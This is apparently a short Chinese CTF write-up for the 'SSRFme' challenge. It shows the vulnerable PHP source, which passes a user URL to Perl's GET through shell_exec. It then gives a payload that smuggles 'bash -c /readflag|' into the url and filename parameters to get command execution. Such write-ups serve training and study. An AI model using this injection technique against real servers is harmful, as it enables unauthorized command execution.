---
title: SSRFme
date: 2021-04-09 20:13:44
tags: wp

---
## ---     



	```php
	<?php
	    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);    ##以逗号分割$_SERVER['HTTP_X_FORWARDED_FOR']，返回数组
	        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];
	    }
	
	    echo $_SERVER["REMOTE_ADDR"];
	
	    $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);      ##$_SERVER["REMOTE_ADDR"]返回IP地址
	    @mkdir($sandbox);    ##创建沙盒 
	    @chdir($sandbox);    ##改变目录到沙盒
	
	    $data = shell_exec("GET " . escapeshellarg($_GET["url"]));
	    $info = pathinfo($_GET["filename"]);
	    $dir  = str_replace(".", "", basename($info["dirname"]));         ##url参数以GET命令执行，结果存入以filename参数的值命名的文件里
	    @mkdir($dir);
	    @chdir($dir);
	    @file_put_contents(basename($info["basename"]), $data);
	    highlight_file(__FILE__);
	```



读取根目录，创建文件abc      
`url=/&filename=abc`     
访问该文件`/sandbox/fcf2bccafc269c160382150a0166d632/abc	`     
 ![01.png](https://ae03.alicdn.com/kf/U9d258cc946ec4e4fb723d7652f2049c7P.jpg)


/readflag得到flag       

`bash -c /readflag|`       
不过要先有一个同名文件     
然后执行该命令       
payload：`?url=file:bash -c /readflag|&filename=bash -c /readflag|`执行两遍，然后访问`bash -c /readflag|`即可得到flag       


[perl脚本中GET命令执行漏洞](https://www.freesion.com/article/5626598350/)